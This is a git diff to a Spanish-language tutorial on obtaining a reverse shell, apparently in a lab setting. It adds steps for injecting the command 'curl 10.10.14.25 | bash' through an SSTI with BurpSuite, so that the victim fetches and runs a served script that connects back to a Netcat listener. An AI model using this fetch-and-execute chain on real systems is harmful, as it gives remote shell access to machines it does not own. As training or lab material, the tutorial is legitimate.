@@ -48,7 +48,7 @@ Lo primero que vamos hacer es preparar nuestro archivo `index.html`, creamos una
 
 Ahora creamos y definimos nuestro archivo `index.html`:
 
-   sudo nano Index.html
+   sudo nano index.html
    
 Copiamos y pegamos el siguiente código:
 
@@ -80,13 +80,19 @@ Abrimos nuestra segunda terminal y ponemos a `Netcat` en escucha por el puerto 4
     
 Ya tenemos nuestro puerto preparado para recibir la reversehe shell.
     
-Finalmente nos dirigimos a la terminal donde estemos en contacto con la victima, es este ejemplo realizare la petición utilizando BurpSuite. Pero básicamente
-lo que debemos es realizar la siguiente petición desde el equipo victima:
+Finalmente nos dirigimos a la terminal donde estemos en contacto con la victima, es este ejemplo realizare la petición utilizando BurpSuite ejecutando el comando
+dentro de un SSTI. Pero básicamente, lo que debemos es realizar la siguiente petición desde el equipo victima:
 
     curl 10.10.14.25 | bash
     
 * `Curl` : Realizara la petición y copiara el archivo index.html desde nuestro servidor creado en python3.
 * `bash` : Ordena la ejecución o interpretación del comando definido dentro del archivo, en nuestro caso, estblecer una reverse shell por el puertop 443.
+
+![Captura de pantalla 2022-07-21 231821](https://user-images.githubusercontent.com/103068924/180316903-81849cbf-96b0-4de3-a9f4-c7e0ab2e6610.png)
+
+![Captura de pantalla 2022-07-21 231506](https://user-images.githubusercontent.com/103068924/180316657-1d03c885-ca4e-41b2-b55d-23f1a8e55b59.png)
+
+Como podeís ver el comando Curl esta dentro de la injeccion SSTI, de tal forma que ya solo quedaria enviar la petición.
 
 Tras ejecutar este ultimo comando se nos tendría que haber abierto una shell en la terminal por la que estabamos en ecucha con NetCat.
 
